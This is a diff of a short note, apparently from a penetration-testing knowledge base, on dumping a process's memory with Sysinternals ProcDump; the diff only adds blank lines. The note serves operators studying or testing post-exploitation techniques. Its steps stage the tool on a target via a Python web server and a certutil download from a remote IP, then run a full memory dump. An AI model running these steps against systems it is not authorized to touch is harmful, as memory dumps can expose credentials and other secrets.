@@ -37,13 +37,21 @@ Dump a process's memory using Sysinternals suite's Procdump into a file.
 
 Dump a process's memory using Sysinternals suite's Procdump into a file. 
 
+
+
 # Instructions
 
 1. Download ProcDump: [Download from Microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
 
 2. Copy procdump.exe or procdump64.exe to the target, depending on the architecture.
 
+
+
 Host ProcDump on a Python 3 Server
+
+
+
+
 
 **Command** ([[Launch a Python 3 Web Server]]):
 
@@ -51,7 +59,15 @@ Host ProcDump on a Python 3 Server
 python3 -m http.server $_PORT
 ```
 
+
+
+
+
 Download ProcDump to the target
+
+
+
+
 
 **Command** ([[certutil.exe -urlcache -split -f "http://$_REMOTE_]]):
 
@@ -59,7 +75,15 @@ Download ProcDump to the target
 certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" $_FILENAME
 ```
 
+
+
+
+
 3. List Processes to identify a target's PID.
+
+
+
+
 
 **Command** ([[Tasklist.exe List Running Processes]]):
 
@@ -67,13 +91,23 @@ certutil.exe -urlcache -split -f "http://$_REMOTE_IP/$_FILENAME" $_FILENAME
 tasklist.exe
 ```
 
+
+
 4. Dump the memory using the PID.
+
+
+
+
 
 **Command** ([[ProcDump Dump the Memory of a Process]]):
 
 ```bash
 procdump.exe -ma $_PID $_OUTPUT.dmp
 ```
+
+
+
+
 
 ## Platforms
 
@@ -101,3 +135,5 @@ procdump.exe -ma $_PID $_OUTPUT.dmp
 
 - [[data exposure]]
 - [[memory]]
+
+
